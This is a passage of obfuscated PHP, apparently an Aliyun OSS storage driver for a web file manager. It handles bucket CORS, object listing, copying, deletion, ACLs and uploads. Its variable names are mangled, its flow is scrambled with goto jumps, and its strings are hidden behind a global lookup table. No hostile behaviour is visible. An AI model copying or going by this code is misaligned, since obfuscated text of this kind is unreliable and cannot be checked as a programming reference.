IO::fileOutImage($fäŒÑã†Î[$eŒ÷Œ¢ˆ¿”[85]], $c¸ê‡Ñ­‹); goto eÁßä÷´·; eÁßä÷´·: } public function fileOutImage($d‚‹ª‰¸Ü, $fÓÔÁ–Îİô = 250) { $this->_fileOutImage($d‚‹ª‰¸Ü, $fÓÔÁ–Îİô); } public function fileOutImageServer($e¯ºáß‹ó, $C‘ªÛºÉá = 250) { $this->_fileOutImage($e¯ºáß‹ó, $C‘ªÛºÉá); } public function link($fÈËóô· , $eé×Š’Ê¼ = '') { $D‡ò›½Œš = $this->model->fileInfoGet($fÈËóô· ); return IO::link($D‡ò›½Œš[$_SERVER[¢Í][85]], $eé×Š’Ê¼); } protected function parse($f ’¤¨«…Í) { $c„İ•í‹æ‡ =& $_SERVER[¢Í]; if (strstr($f ’¤¨«…Í, $c„İ•í‹æ‡[8]) === !1) { return array($c„İ•í‹æ‡[410] => intval($f ’¤¨«…Í), $c„İ•í‹æ‡[85] => $c„İ•í‹æ‡[33], $c„İ•í‹æ‡[1170] => array()); } $C¨„Ñç¾­— = explode($c„İ•í‹æ‡[8], trim($f ’¤¨«…Í, $c„İ•í‹æ‡[8])); if (count($C¨„Ñç¾­—) < 2) { show_tips($f ’¤¨«…Í . $c„İ•í‹æ‡[1175]); } return array($c„İ•í‹æ‡[410] => intval($C¨„Ñç¾­—[0]), $c„İ•í‹æ‡[85] => $C¨„Ñç¾­—[1], $c„İ•í‹æ‡[1170] => array_slice($C¨„Ñç¾­—, 1)); } } goto c÷âÍÓÁÊ; bŠ°ºÉíê: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($B¼º¨—¼õÒ) { parent::__construct(); include_once SDK_DIR . $_SERVER[¢Í][1222]; $this->_init($B¼º¨—¼õÒ); } public function _init($c×¶ëåêÀ) { $FµÜè…§£Ó =& $_SERVER[¢Í]; foreach ($c×¶ëåêÀ as $a¨·«Ò¸ˆ => $a¨¨ÆÙ‘—®) { if (isset($this->{$a¨·«Ò¸ˆ})) { $this->{$a¨·«Ò¸ˆ} = $a¨¨ÆÙ‘—®; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($FµÜè…§£Ó[1223] . LNG($FµÜè…§£Ó[1224])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto EäŸÀ²‹á¤; d¶ÓµÁÃ£æ: $Bâ«ì°©®ˆ->addAllowedOrigin($eÙÌëâæ¼Ì[1225]); $Bâ«ì°©®ˆ->addAllowedMethod($eÙÌëâæ¼Ì[1226]); $Bâ«ì°©®ˆ->addAllowedMethod($eÙÌëâæ¼Ì[1227]); goto fĞº¸¥ÆÕ; fĞº¸¥ÆÕ: $Bâ«ì°©®ˆ->addAllowedMethod($eÙÌëâæ¼Ì[1228]); $Bâ«ì°©®ˆ->addAllowedMethod($eÙÌëâæ¼Ì[1229]); $Bâ«ì°©®ˆ->addAllowedMethod($eÙÌëâæ¼Ì[165]); goto E„¨–Ò¦; EäŸÀ²‹á¤: $eÙÌëâæ¼Ì =& $_SERVER[¢Í]; $DÜ»­Šæœ× = new OSS\Model\CorsConfig(); $Bâ«ì°©®ˆ = new OSS\Model\CorsRule(); goto d¶ÓµÁÃ£æ; aíã°ÏØ‰é: $DÜ»­Šæœ×->addRule($Bâ«ì°©®ˆ); try { $this->client->putBucketCors($this->bucket, $DÜ»­Šæœ×); } catch (OSS\Core\OssException $C¤ ¦ë„òÈ) { return !1; } return !0; goto EÛ¨Øîì¦; E„¨–Ò¦: $Bâ«ì°©®ˆ->setMaxAgeSeconds(600); $Bâ«ì°©®ˆ->addExposeHeader($eÙÌëâæ¼Ì[1230]); $Bâ«ì°©®ˆ->addAllowedHeader($eÙÌëâæ¼Ì[1225]); goto aíã°ÏØ‰é; EÛ¨Øîì¦: } public function getBucketCors() { goto f‚ÃöµµÜÂ; dŠÙà«ò•æ: return array($C‘ãîÜïøˆ[189] => isset($d÷¦¥´[0]) ? $d÷¦¥´[0] : $C‘ãîÜïøˆ[33], $C‘ãîÜïøˆ[193] => $EŞªò¸ÅŸÒ, $C‘ãîÜïøˆ[1231] => $b´ÒÔì‹ÉÛ, $C‘ãîÜïøˆ[1232] => isset($eîõïìğãª[0]) ? $eîõïìğãª[0] : $C‘ãîÜïøˆ[33], $C‘ãîÜïøˆ[191] => isset($f¢šŒ¿ÅÄ•[0]) ? $f¢šŒ¿ÅÄ•[0] : $C‘ãîÜïøˆ[33]); goto B§‡•¼ª‡Ô; F«ª¦ƒìøÙ: if (!$BÄÌ®í£«ª || !($Aƒ™ Ú»–‹ = $BÄÌ®í£«ª->getRules())) { return null; } $d÷¦¥´ = $Aƒ™ Ú»–‹[0]->getAllowedOrigins(); $EŞªò¸ÅŸÒ = $Aƒ™ Ú»–‹[0]->getAllowedMethods(); goto B¹äˆĞöœ”; B¹äˆĞöœ”: $b´ÒÔì‹ÉÛ = $Aƒ™ Ú»–‹[0]->getMaxAgeSeconds(); $eîõïìğãª = $Aƒ™ Ú»–‹[0]->getExposeHeaders(); $f¢šŒ¿ÅÄ• = $Aƒ™ Ú»–‹[0]->getAllowedHeaders(); goto dŠÙà«ò•æ; f‚ÃöµµÜÂ: $C‘ãîÜïøˆ =& $_SERVER[¢Í]; $BÄÌ®í£«ª = null; try { $BÄÌ®í£«ª = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $A¸²Ş­åÁË) { return null; } goto F«ª¦ƒìøÙ; B§‡•¼ª‡Ô: } public function isBucketCors() { goto eâ¿ÆÖ‚Şğ; Bö£×ëç‹Ğ: $A„ÍæŠË™ = array($fèƒôìŠ‚[194], $fèƒôìŠ‚[195], $fèƒôìŠ‚[196], $fèƒôìŠ‚[197], $fèƒôìŠ‚[198]); $DÉõ©Æâ˜„ = array_diff($A„ÍæŠË™, $fñâ÷­”£); return empty($DÉõ©Æâ˜„); goto C…©ë®£¡; eâ¿ÆÖ‚Şğ: $fèƒôìŠ‚ =& $_SERVER[¢Í]; $cœª´ë‘ù = $this->getBucketCors(); if (!$cœª´ë‘ù || !is_array($cœª´ë‘ù)) { return !1; } goto B½ã¡ÛÕ’ğ; B½ã¡ÛÕ’ğ: if ($cœª´ë‘ù[$fèƒôìŠ‚[189]] != $fèƒôìŠ‚[190] || $cœª´ë‘ù[$fèƒôìŠ‚[191]] != $fèƒôìŠ‚[190]) { return !1; } $fñâ÷­”£ = array_map($fèƒôìŠ‚[192], $cœª´ë‘ù[$fèƒôìŠ‚[193]]); if (!is_array($fñâ÷­”£)) { $fñâ÷­”£ = array(); } goto Bö£×ëç‹Ğ; C…©ë®£¡: } public function mkfile($FÖíÔ¾¸ôË, $BÈ«­ÎÀÈ = '', $A„»Ô³‘ö = REPEAT_RENAME) { $f¼é¿ùó™Ã = $this->setContent($FÖíÔ¾¸ôË, $BÈ«­ÎÀÈ); if ($f¼é¿ùó™Ã !== !1) { return $this->getPathOuter($FÖíÔ¾¸ôË); } return !1; } public function mkdir($eŞİŒ‡ç, $FÁ¥•ª–² = REPEAT_SKIP) { if ($this->_isFolder($eŞİŒ‡ç)) { return $this->getPathOuter($eŞİŒ‡ç); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($eŞİŒ‡ç)); } catch (OSS\Core\OssException $AæøÚ“ôÆÅ) { return !1; } return $this->getPathOuter($eŞİŒ‡ç); } private function fileList($AƒäŞ›¬ôË, $aëÒÑµ¶Ö¬ = '', $e´ÁòŒë« = 0) { goto F”ÚÍ´ ÄŠ; aïå¬…¹Û: $cœ‰ŠŞù·… = $aÖ„‰ÁËğ = array(); while (!0) { check_abort(); $C£Ó¹ÀÖÜé = array($B·‹Æ¹ºÊ¡[1233] => $aëÒÑµ¶Ö¬, $B·‹Æ¹ºÊ¡[1234] => $F×éâÍÔåÁ, $B·‹Æ¹ºÊ¡[1235] => $AËÖËÛÙñ, $B·‹Æ¹ºÊ¡[1236] => $e³”ÄŠ§ğ™); try { $dí¯§ªõƒ™ = $this->client->listObjects($this->bucket, $C£Ó¹ÀÖÜé); } catch (OSS\Core\OssException $aåùÛÌ—) { break; } $e³”ÄŠ§ğ™ = $dí¯§ªõƒ™->getNextMarker(); $e‰—ëˆßğ¿ = $dí¯§ªõƒ™->getObjectList(); $B¯ËÁäŠá» = $dí¯§ªõƒ™->getPrefixList(); foreach ($e‰—ëˆßğ¿ as $cµö×ƒÑ±) { goto D‘Ø‰˜ªô½; d¦í…òôô: $e‹ˆ¦îÈ‰ = $cµö×ƒÑ±->getLastModified(); $aìÆ¿‡™» = $e´ÁòŒë« ? array($B·‹Æ¹ºÊ¡[28] => $d…óÇƒ»èß, $B·‹Æ¹ºÊ¡[87] => $bùÔÌ–¥•„, $B·‹Æ¹ºÊ¡[203] => strtotime($e‹ˆ¦îÈ‰)) : $d…óÇƒ»èß; $cá¾Î‚•¨Š = $bùÔÌ–¥•„ == 0 && substr($d…óÇƒ»èß, strlen($d…óÇƒ»èß) - 1, 1) == $B·‹Æ¹ºÊ¡[8] ? !0 : !1; goto Eô»¿¢„; Eô»¿¢„: if ($f±¦ù©—Ÿ¾) { $this->cacheMethod($B·‹Æ¹ºÊ¡[205], $d…óÇƒ»èß, $cá¾Î‚•¨Š); $this->cacheMethod($B·‹Æ¹ºÊ¡[206], $d…óÇƒ»èß, array($B·‹Æ¹ºÊ¡[87] => $bùÔÌ–¥•„, $B·‹Æ¹ºÊ¡[1237] => $bùÔÌ–¥•„, $B·‹Æ¹ºÊ¡[117] => strtotime($e‹ˆ¦îÈ‰), $B·‹Æ¹ºÊ¡[1238] => $e‹ˆ¦îÈ‰)); } if ($cá¾Î‚•¨Š) { $cœ‰ŠŞù·…[] = $d…óÇƒ»èß; continue; } $aÖ„‰ÁËğ[] = $aìÆ¿‡™»; goto EâÂÓ‘„„È; D‘Ø‰˜ªô½: if ($cµö×ƒÑ±->getKey() == $F×éâÍÔåÁ) { continue; } $d…óÇƒ»èß = $cµö×ƒÑ±->getKey(); $bùÔÌ–¥•„ = $cµö×ƒÑ±->getSize(); goto d¦í…òôô; EâÂÓ‘„„È: } foreach ($B¯ËÁäŠá» as $D…ÄÅ‡…êà) { $cœ‰ŠŞù·…[] = $D…ÄÅ‡…êà->getPrefix(); if ($f±¦ù©—Ÿ¾) { $this->cacheMethod($B·‹Æ¹ºÊ¡[205], $d…óÇƒ»èß, !0); } } if ($e³”ÄŠ§ğ™ === $B·‹Æ¹ºÊ¡[33]) { break; } } if ($f±¦ù©—Ÿ¾) { $this->cacheMethod($B·‹Æ¹ºÊ¡[205], $AƒäŞ›¬ôË, !0); } goto DêÂÜ¼‡Ñõ; eˆªßÄ¬: $e³”ÄŠ§ğ™ = $B·‹Æ¹ºÊ¡[33]; $AËÖËÛÙñ = 1000; $f±¦ù©—Ÿ¾ = $this->listItemCache === !1 ? !1 : !0; goto aïå¬…¹Û; F”ÚÍ´ ÄŠ: $B·‹Æ¹ºÊ¡ =& $_SERVER[¢Í]; $AƒäŞ›¬ôË = trim($AƒäŞ›¬ôË, $B·‹Æ¹ºÊ¡[8]); $F×éâÍÔåÁ = empty($AƒäŞ›¬ôË) ? $B·‹Æ¹ºÊ¡[33] : $AƒäŞ›¬ôË . $B·‹Æ¹ºÊ¡[8]; goto eˆªßÄ¬; DêÂÜ¼‡Ñõ: return array($B·‹Æ¹ºÊ¡[84] => $cœ‰ŠŞù·…, $B·‹Æ¹ºÊ¡[83] => $aÖ„‰ÁËğ); goto E¸×Û³‡¯; E¸×Û³‡¯: } public function copyFile($e„ºµ´êÛô, $E‰ö¦ïÒÓ) { $Eì¿«Ô´á¿ = $this->size($e„ºµ´êÛô); if ($Eì¿«Ô´á¿ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $e„ºµ´êÛô, $this->bucket, $this->pathEncode($E‰ö¦ïÒÓ)); } catch (OSS\Core\OssException $D·Âùè÷®Á) { return !1; } return $this->getPathOuter($E‰ö¦ïÒÓ); } $cÛ³ñœ«ƒÛ = $this->multiCopyObject($e„ºµ´êÛô, $E‰ö¦ïÒÓ, $Eì¿«Ô´á¿); return $cÛ³ñœ«ƒÛ ? $this->getPathOuter($E‰ö¦ïÒÓ) : !1; } private function multiCopyObject($EÁ›†ääì¼, $aíÔ‰¸í÷…, $fÂ×ÒÍˆˆ•) { $Eø¸ï‹‡íÁ =& $_SERVER[¢Í]; try { goto bî‹ì‡ó¶¯; Eöù«Ö’: $bíÈ•ùÖ = array(); foreach ($EßÈÊˆÄîù as $FÌØöã†‰¯ => $Cé¡•¬·–æ) { $bíÈ•ùÖ[] = array($Eø¸ï‹‡íÁ[1243] => $FÌØöã†‰¯ + 1, $Eø¸ï‹‡íÁ[1244] => $Cé¡•¬·–æ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($aíÔ‰¸í÷…), $B±ŠÂ¯Û¿, $bíÈ•ùÖ); goto C§»ñƒ‚ãá; bî‹ì‡ó¶¯: $AïÇÉ¿Ûß¤ = array(); if ($a’Ó‚ïêí¯ = $this->hashMd5($EÁ›†ääì¼)) { $AïÇÉ¿Ûß¤ = array(OSS\OssClient::OSS_HEADERS => array($Eø¸ï‹‡íÁ[1239] => $a’Ó‚ïêí¯)); } $B±ŠÂ¯Û¿ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($aíÔ‰¸í÷…), $AïÇÉ¿Ûß¤); goto C£¯µ»ŠôÚ; C£¯µ»ŠôÚ: $BˆÎ³‰¨²® = 1; $E¼Æƒ¾”«¾ = 0; $EßÈÊˆÄîù = array(); goto DâÅ¤„À³°; DâÅ¤„À³°: $dµäƒÈŒäí = 1024 * 1024 * 10; $DàİµÊËà† = $this->client->generateMultiuploadParts($fÂ×ÒÍˆˆ•, $dµäƒÈŒäí); foreach ($DàİµÊËà† as $FÌØöã†‰¯ => $d ö¤İË§’) { $d¾¡Ò£ù”¼ = $E¼Æƒ¾”«¾ + (int) $d ö¤İË§’[$Eø¸ï‹‡íÁ[1240]]; $DÅˆ†ùó = (int) $d ö¤İË§’[$Eø¸ï‹‡íÁ[340]] + $d¾¡Ò£ù”¼ - 1; $b‚È¥£Ã = array($Eø¸ï‹‡íÁ[1241] => $d¾¡Ò£ù”¼, $Eø¸ï‹‡íÁ[1242] => $DÅˆ†ùó); $EßÈÊˆÄîù[] = $this->client->uploadPartCopy($this->bucket, $EÁ›†ääì¼, $this->bucket, $this->pathEncode($aíÔ‰¸í÷…), $BˆÎ³‰¨²®, $B±ŠÂ¯Û¿, $b‚È¥£Ã); $BˆÎ³‰¨²® = $BˆÎ³‰¨²® + 1; } goto Eöù«Ö’; C§»ñƒ‚ãá: } catch (OSS\Core\OssException $AóêÈì×á) { return !1; } return !0; } public function moveFile($Aš«›‚äÀ, $B¶¹ãÈ½ˆÔ) { if ($this->copyFile($Aš«›‚äÀ, $B¶¹ãÈ½ˆÔ)) { $this->remove($Aš«›‚äÀ); return $this->getPathOuter($B¶¹ãÈ½ˆÔ); } return !1; } public function delFile($D»Ú‡ööŞº) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($D»Ú‡ööŞº)); } catch (OSS\Core\OssException $A´£ÉÃ˜Œ) { return !1; } return !0; } public function delFolder($b“«‹øÅà§) { goto aîíóÖˆ±; fïÃ…Ñõ¦—: $cÍÄ»×å” = $this->fileList($b“«‹øÅà§); $this->listItemCache = !0; $AÑêƒ¥œÂ = trim($b“«‹øÅà§, $cŞ¾÷õ×Ñ˜[8]) . $cŞ¾÷õ×Ñ˜[8]; goto dã–Î¿æÈÊ; FîÉõŠŸë¯: return $this->delByBatch($cÍÄ»×å”[$cŞ¾÷õ×Ñ˜[84]]); goto AôÅ¿À³; dã–Î¿æÈÊ: if (!empty($b“«‹øÅà§) && !in_array($AÑêƒ¥œÂ, $cÍÄ»×å”[$cŞ¾÷õ×Ñ˜[84]])) { $cÍÄ»×å”[$cŞ¾÷õ×Ñ˜[84]][] = $AÑêƒ¥œÂ; } $açÃ¬“Ÿ° = $this->delByBatch($cÍÄ»×å”[$cŞ¾÷õ×Ñ˜[83]]); if (!$açÃ¬“Ÿ°) { return !1; } goto FîÉõŠŸë¯; aîíóÖˆ±: $cŞ¾÷õ×Ñ˜ =& $_SERVER[¢Í]; if (!$this->exist($b“«‹øÅà§)) { return !0; } $this->listItemCache = !1; goto fïÃ…Ñõ¦—; AôÅ¿À³: } private function delByBatch($bÄÉµâ»³) { foreach (array_chunk($bÄÉµâ»³, 1000) as $f¼µ¢â¬ÚÍ) { try { $this->client->deleteObjects($this->bucket, $f¼µ¢â¬ÚÍ); } catch (OSS\Core\OssException $A˜“µ§ùî) { return !1; } } return !0; } public function rename($B ˜†ƒ—ë„, $e’âè»·ùÛ) { return $this->renameObject($B ˜†ƒ—ë„, $e’âè»·ùÛ); } private function fileInfo($D®óßÃÚ…, $b„ë™š˜ë› = false, $fµõ îÎ†¬ = array()) { goto d¨°† ßƒ•; Bµ…‰‰‹Š: if (isset($fµõ îÎ†¬[$C…á¶´‡¢Æ[87]])) { $aø›İ¦×[$C…á¶´‡¢Æ[87]] = $fµõ îÎ†¬[$C…á¶´‡¢Æ[87]]; } if (isset($fµõ îÎ†¬[$C…á¶´‡¢Æ[117]])) { $aø›İ¦×[$C…á¶´‡¢Æ[117]] = $fµõ îÎ†¬[$C…á¶´‡¢Æ[117]]; } if (isset($fµõ îÎ†¬[$C…á¶´‡¢Æ[203]]) && !trim($aø›İ¦×[$C…á¶´‡¢Æ[117]])) { $aø›İ¦×[$C…á¶´‡¢Æ[117]] = $fµõ îÎ†¬[$C…á¶´‡¢Æ[203]]; } goto A¿®°éßä¿; A¿®°éßä¿: return $aø›İ¦×; goto Dİº…šŞ÷Î; BíËß¬×äƒ: $aø›İ¦×[$C…á¶´‡¢Æ[200]] = $aø›İ¦×[$C…á¶´‡¢Æ[117]] = 0; $aø›İ¦×[$C…á¶´‡¢Æ[201]] = $aø›İ¦×[$C…á¶´‡¢Æ[202]] = !0; if (empty($fµõ îÎ†¬)) { $F›¨íòï±‚ = $this->objectMeta($D®óßÃÚ…); if (!$F›¨íòï±‚) { return $aø›İ¦×; } $fµõ îÎ†¬ = array($C…á¶´‡¢Æ[117] => strtotime($F›¨íòï±‚[$C…á¶´‡¢Æ[1238]]), $C…á¶´‡¢Æ[87] => $F›¨íòï±‚[$C…á¶´‡¢Æ[1237]] + 0); } goto Bµ…‰‰‹Š; d¨°† ßƒ•: $C…á¶´‡¢Æ =& $_SERVER[¢Í]; $aø›İ¦× = array($C…á¶´‡¢Æ[28] => $this->pathThis($D®óßÃÚ…), $C…á¶´‡¢Æ[85] => $this->getPathOuter($D®óßÃÚ…), $C…á¶´‡¢Æ[29] => $C…á¶´‡¢Æ[181], $C…á¶´‡¢Æ[87] => isset($fµõ îÎ†¬[$C…á¶´‡¢Æ[87]]) ? $fµõ îÎ†¬[$C…á¶´‡¢Æ[87]] : 0, $C…á¶´‡¢Æ[175] => $this->ext($D®óßÃÚ…)); if ($b„ë™š˜ë›) { return $aø›İ¦×; } goto BíËß¬×äƒ; Dİº…šŞ÷Î: } private function folderInfo($F¶¸Õ‚Ô£», $A•é‘“ÇÑÒ = false, $c¥‘Ÿ¤ªÚ = array()) { goto c„ÀÕ‚Õ°‚; B††´¬¢Ê: if (isset($c¥‘Ÿ¤ªÚ[$A‡Àùôøã[117]])) { $FÂÃÊ’Î‹‡[$A‡Àùôøã[117]] = $c¥‘Ÿ¤ªÚ[$A‡Àùôøã[117]]; } if (isset($c¥‘Ÿ¤ªÚ[$A‡Àùôøã[200]])) { $FÂÃÊ’Î‹‡[$A‡Àùôøã[200]] = $c¥‘Ÿ¤ªÚ[$A‡Àùôøã[200]]; } return $FÂÃÊ’Î‹‡; goto CÓÑÖêµİ‰; c„ÀÕ‚Õ°‚: $A‡Àùôøã =& $_SERVER[¢Í]; $FÂÃÊ’Î‹‡ = array($A‡Àùôøã[28] => $this->pathThis($F¶¸Õ‚Ô£»), $A‡Àùôøã[85] => $this->getPathOuter($A‡Àùôøã[8] . $F¶¸Õ‚Ô£»), $A‡Àùôøã[29] => $A‡Àùôøã[86]); if ($A•é‘“ÇÑÒ) { return $FÂÃÊ’Î‹‡; } goto Dºƒ÷¿æ’¼; Dºƒ÷¿æ’¼: $FÂÃÊ’Î‹‡[$A‡Àùôøã[200]] = $FÂÃÊ’Î‹‡[$A‡Àùôøã[117]] = 0; $FÂÃÊ’Î‹‡[$A‡Àùôøã[201]] = $FÂÃÊ’Î‹‡[$A‡Àùôøã[202]] = !0; if (empty($c¥‘Ÿ¤ªÚ)) { $F¶¸Õ‚Ô£» = rtrim($F¶¸Õ‚Ô£», $A‡Àùôøã[8]) . $A‡Àùôøã[8]; $AíÀå•Àã = $this->objectMeta($F¶¸Õ‚Ô£»); if (!$AíÀå•Àã) { return $FÂÃÊ’Î‹‡; } $c¥‘Ÿ¤ªÚ = array($A‡Àùôøã[200] => $AíÀå•Àã[$A‡Àùôøã[1245]][$A‡Àùôøã[1246]], $A‡Àùôøã[117] => strtotime($AíÀå•Àã[$A‡Àùôøã[1238]])); } goto B††´¬¢Ê; CÓÑÖêµİ‰: } public function listPath($BøÂŸ™³³, $bĞ»ÖÏÁÌÅ = false) { $a„ƒªÏæ†Ş =& $_SERVER[¢Í]; $bôŒäÃ™ª = $this->fileList($BøÂŸ™³³, $a„ƒªÏæ†Ş[8], !0); foreach ($bôŒäÃ™ª[$a„ƒªÏæ†Ş[84]] as $BğîÕ»·‰ª => $f’Ş¼÷·½¬) { $bôŒäÃ™ª[$a„ƒªÏæ†Ş[84]][$BğîÕ»·‰ª] = $this->folderInfo($f’Ş¼÷·½¬, $bĞ»ÖÏÁÌÅ, $f’Ş¼÷·½¬); } foreach ($bôŒäÃ™ª[$a„ƒªÏæ†Ş[83]] as $BğîÕ»·‰ª => $f’Ş¼÷·½¬) { $bôŒäÃ™ª[$a„ƒªÏæ†Ş[83]][$BğîÕ»·‰ª] = $this->fileInfo($f’Ş¼÷·½¬[$a„ƒªÏæ†Ş[28]], $bĞ»ÖÏÁÌÅ, $f’Ş¼÷·½¬); } return $bôŒäÃ™ª; } public function has($D»¶ßå„¤, $CŠóôÔ¸„© = false, $cÛµºÀåÓ = true) { goto Eêµ…ÖëÜ…; aùªÕ¹»öĞ: $FÅêæÈŠÔ = $Eõ¥«ºÄÁ[33]; $d•¨ÆæÃø× = 500; $D®Ó“÷šâ¨ = $cÌÁ‹†‰¤ë = 0; goto EôîŒàçïˆ; Eêµ…ÖëÜ…: $Eõ¥«ºÄÁ =& $_SERVER[¢Í]; $D»¶ßå„¤ = trim($D»¶ßå„¤, $Eõ¥«ºÄÁ[8]); $C°«™ìÓ‚Ç = empty($D»¶ßå„¤) ? $Eõ¥«ºÄÁ[33] : $D»¶ßå„¤ . $Eõ¥«ºÄÁ[8]; goto aùªÕ¹»öĞ; EôîŒàçïˆ: while (!0) { check_abort(); $C‚ÑÇ±íë» = array($Eõ¥«ºÄÁ[1233] => $Eõ¥«ºÄÁ[8], $Eõ¥«ºÄÁ[1234] => $C°«™ìÓ‚Ç, $Eõ¥«ºÄÁ[1235] => $d•¨ÆæÃø×, $Eõ¥«ºÄÁ[1236] => $FÅêæÈŠÔ); try { $BÊæ™‰­ = $this->client->listObjects($this->bucket, $C‚ÑÇ±íë»); } catch (OSS\Core\OssException $e¡ÂŒ¥¢²ò) { break; } $FÅêæÈŠÔ = $BÊæ™‰­->getNextMarker(); $fè½’Î‰ê = $BÊæ™‰­->getObjectList(); $f„½¹ÒÜÒ• = $BÊæ™‰­->getPrefixList(); if ($CŠóôÔ¸„©) { if (count($fè½’Î‰ê) > 1 || count($fè½’Î‰ê) == 1 && $fè½’Î‰ê[0]->getKey() != $C°«™ìÓ‚Ç) { $D®Ó“÷šâ¨ += count($fè½’Î‰ê) - 1; } if (!empty($f„½¹ÒÜÒ•)) { $cÌÁ‹†‰¤ë += count($f„½¹ÒÜÒ•); } if ($FÅêæÈŠÔ === $Eõ¥«ºÄÁ[33]) { break; } continue; } if ($cÛµºÀåÓ) { if (!empty($fè½’Î‰ê)) { if (count($fè½’Î‰ê) > 1 || $fè½’Î‰ê[0]->getKey() != $C°«™ìÓ‚Ç) { return !0; } } } else { if (!empty($f„½¹ÒÜÒ•)) { return !0; } } if ($FÅêæÈŠÔ === $Eõ¥«ºÄÁ[33]) { break; } } if ($CŠóôÔ¸„©) { return array($Eõ¥«ºÄÁ[209] => $D®Ó“÷šâ¨, $Eõ¥«ºÄÁ[210] => $cÌÁ‹†‰¤ë); } return !1; goto cÈ¦ã•Öåœ; cÈ¦ã•Öåœ: } public function listAll($d†ŒÄëöäí) { $AòğÍöİ =& $_SERVER[¢Í]; $fÌĞ¿¸À¯ = $this->fileList($d†ŒÄëöäí, $AòğÍöİ[33], !0); $f¨Ñ¬­™†Ö = array(); foreach ($fÌĞ¿¸À¯[$AòğÍöİ[83]] as $BöÅÕÓ¸“) { $f¨Ñ¬­™†Ö[$BöÅÕÓ¸“[$AòğÍöİ[28]]] = $BöÅÕÓ¸“[$AòğÍöİ[87]]; } foreach ($fÌĞ¿¸À¯[$AòğÍöİ[84]] as $BöÅÕÓ¸“) { if (is_string($BöÅÕÓ¸“)) { $f¨Ñ¬­™†Ö[$BöÅÕÓ¸“] = 0; } } return $this->listAllFiles($d†ŒÄëöäí, array_keys($f¨Ñ¬­™†Ö), $f¨Ñ¬­™†Ö); } public function canRead($d…Ëµ¿çº®) { $b‚„äÔÜïÏ =& $_SERVER[¢Í]; $AâÕÓé¦İ¯ = $this->pathAcl($d…Ëµ¿çº®); return $AâÕÓé¦İ¯ == $b‚„äÔÜïÏ[1247] || $AâÕÓé¦İ¯ == $b‚„äÔÜïÏ[517] ? !0 : !1; } public function canWrite($FĞÎº×óçª) { $A’êñÅå„ = $this->pathAcl($FĞÎº×óçª); return $A’êñÅå„ == $_SERVER[¢Í][517] ? !0 : !1; } public function pathAcl($D˜İ¤š’æÜ) { goto fœÍÁöçœœ; fœÍÁöçœœ: $e¼êé–ÈÍÓ =& $_SERVER[¢Í]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $E‘ØÒŒÆÕ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($D˜İ¤š’æÜ)); } catch (OSS\Core\OssException $AŸ÷Î‘ìî¢) { return !1; } goto d’˜èáø¦; CÜÒ¢ŞÓß: return $f…ˆñ¶‚; goto EàÖè› Ÿ¶; d’˜èáø¦: $f…ˆñ¶‚ = $E‘ØÒŒÆÕ == $e¼êé–ÈÍÓ[34] ? $this->bucketAcl : $E‘ØÒŒÆÕ; if ($f…ˆñ¶‚ == $e¼êé–ÈÍÓ[1248]) { return $e¼êé–ÈÍÓ[1247]; } if ($f…ˆñ¶‚ == $e¼êé–ÈÍÓ[1249]) { return $e¼êé–ÈÍÓ[517]; } goto CÜÒ¢ŞÓß; EàÖè› Ÿ¶: } private function chmodPath($CÉÃ…–¸Íİ, $Cğ¯Êš…†ª = '') { $c®ÉïÏâÌ• =& $_SERVER[¢Í]; $DöÕößÅ = empty($Cğ¯Êš…†ª) ? $c®ÉïÏâÌ•[1249] : $Cğ¯Êš…†ª; $CàÓŒ²ùĞÙ = array($c®ÉïÏâÌ•[34], $c®ÉïÏâÌ•[199], $c®ÉïÏâÌ•[1248], $c®ÉïÏâÌ•[1249]); if (!in_array($DöÕößÅ, $CàÓŒ²ùĞÙ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($CÉÃ…–¸Íİ), $DöÕößÅ); } catch (OSS\Core\OssException $F»¥„”­‘æ) { return !1; } return !0; } public function getContent($d¡µ¡Œ‚µ…) { return $this->fileSubstr($d¡µ¡Œ‚µ…, -1); } public function setContent($d¯ÅÊøŒ£…, $aÀ©¤ÔÇ²¸ = '') { $D Ë®÷Á®‘ =& $_SERVER[¢Í]; try { $cñî¯ÊõÕ¦ = $this->trafficLimit($D Ë®÷Á®‘[1250]); $dÍÆøµ™Ì¸ = $this->client->putObject($this->bucket, $this->pathEncode($d¯ÅÊøŒ£…), $aÀ©¤ÔÇ²¸, $cñî¯ÊõÕ¦); } catch (OSS\Core\OssException $F£¡Šõ‘ÚÚ) { return !1; } $c÷”…‡Ÿ¯¦ = array($D Ë®÷Á®‘[1239] => trim($dÍÆøµ™Ì¸[$D Ë®÷Á®‘[1251]], $D Ë®÷Á®‘[123]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($d¯ÅÊøŒ£…))); $this->updateObjMeta($d¯ÅÊøŒ£…, $c÷”…‡Ÿ¯¦); return isset($dÍÆøµ™Ì¸[$D Ë®÷Á®‘[1252]][$D Ë®÷Á®‘[1198]]) ? !0 : !1; } private function updateObjMeta($e÷‹¿…íœ¦, $a³ñ¹· ‹œ) { $e÷‹¿…íœ¦ = $this->pathEncode($e÷‹¿…íœ¦); try { $e×ÓŞÁè… = array(OSS\OssClient::OSS_HEADERS => $a³ñ¹· ‹œ); $this->client->copyObject($this->bucket, $e÷‹¿…íœ¦, $this->bucket, $e÷‹¿…íœ¦, $e×ÓŞÁè…); } catch (OSS\Core\OssException $CÃ½—çğ ) { return !1; } return !0; } public function upload($b‘Ì©ª, $cï¡ïµŠ¼ç, $bØßØ·À÷· = false, $DÂ¨ß•ÈŒŠ = REPEAT_REPLACE) { $F´Š¿ˆ¤½ =& $_SERVER[¢Í]; $cºŞÙŒ‰§Ö = trim($b‘Ì©ª, 